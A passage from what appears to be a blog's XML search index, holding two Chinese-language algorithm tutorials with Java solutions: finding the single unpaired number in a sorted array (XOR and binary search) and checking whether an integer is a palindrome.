      <link href="/2018/12/09/suan-fa/shu-zu/you-xu-shu-zu-zhong-de-dan-shen-shu-zi/"/>
      <url>/2018/12/09/suan-fa/shu-zu/you-xu-shu-zu-zhong-de-dan-shen-shu-zi/</url>
      
        <content type="html"><![CDATA[<h2 id="有序数组中的单身数字"><a href="#有序数组中的单身数字" class="headerlink" title="有序数组中的单身数字"></a>有序数组中的单身数字</h2><p><strong>问题</strong></p><p>这个题目说的是，给你一个<strong>排好序</strong>的整数数组，里面的数字都出现两次，只有一个数字出现了一次，我们管它叫单身数字，你要写代码找到这个单身数字。</p><pre class=" language-markdown"><code class="language-markdown">比如说给你的有序数组是：1, 1, 2, 2, 4, 4, 6, 8, 8这个数组里 6 只出现了一次，因此你要返回的数字就是 6。</code></pre><p><strong>代码</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AlgoCasts</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// Time: O(n), Space: O(1)</span>  <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">singleNumInSortedArrayWithXOR</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> num<span class="token operator">:</span> nums<span class="token punctuation">)</span> result <span class="token operator">^=</span> num<span class="token punctuation">;</span>    <span class="token keyword">return</span> result<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(log(n)), Space: O(1)</span>  <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">singleNumInSortedArrayBinarySearch</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> low <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> high <span class="token operator">=</span> nums<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>low <span class="token operator">&lt;=</span> high<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">int</span> mid <span class="token operator">=</span> low <span class="token operator">+</span> <span class="token punctuation">(</span>high <span class="token operator">-</span> low<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>mid<span class="token operator">-</span><span class="token number">1</span> <span class="token operator">>=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> nums<span class="token punctuation">[</span>mid<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token operator">--</span>mid<span class="token punctuation">;</span>      <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>mid<span class="token operator">+</span><span class="token number">1</span> <span class="token operator">&lt;</span> nums<span class="token punctuation">.</span>length <span class="token operator">&amp;&amp;</span> nums<span class="token punctuation">[</span>mid<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>mid<span class="token operator">-</span>low<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> high <span class="token operator">=</span> mid <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>      <span class="token keyword">else</span> low <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 数组 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>回文数字判断</title>
      <link href="/2018/12/08/suan-fa/hui-wen-shu-zi-pan-duan/"/>
      <url>/2018/12/08/suan-fa/hui-wen-shu-zi-pan-duan/</url>
      
        <content type="html"><![CDATA[<h2 id="回文数字判断"><a href="#回文数字判断" class="headerlink" title="回文数字判断"></a>回文数字判断</h2><p><strong>问题</strong></p><p>这个题目说的是，给你一个整数，你要判断它是否是一个回文数字。所谓回文数字就是，你正着读和反着读都是同一个数字。</p><pre class=" language-markdown"><code class="language-markdown">比如，给你的数字是：12321无论你从左向右读，还是从右向左读，都是 12321，所以它是一个回文数字，你要返回 true。再比如说：-232你从左向右读是 -232，但从右向左读则是 232-，和 -232 不一样，因此它不是一个回文数字，你要返回 false。</code></pre><p><strong>代码</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AlgoCasts</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// Time: O(m), Space: O(1)</span>  <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isPalindromeString</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span>    String str <span class="token operator">=</span> String<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> j <span class="token operator">=</span> str<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;</span> j<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>str<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">!=</span> str<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>      <span class="token operator">++</span>i<span class="token punctuation">;</span>      <span class="token operator">--</span>j<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(m), Space: O(1)</span>  <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isPalindrome</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> tmp <span class="token operator">=</span> x<span class="token punctuation">;</span>    <span class="token keyword">long</span> y <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>tmp <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">int</span> num <span class="token operator">=</span> tmp <span class="token operator">%</span> <span class="token number">10</span><span class="token punctuation">;</span>      y <span class="token operator">=</span> y <span class="token operator">*</span> <span class="token number">10</span> <span class="token operator">+</span> num<span class="token punctuation">;</span>      tmp <span class="token operator">=</span> tmp <span class="token operator">/</span> <span class="token number">10</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> y <span class="token operator">==</span> x<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
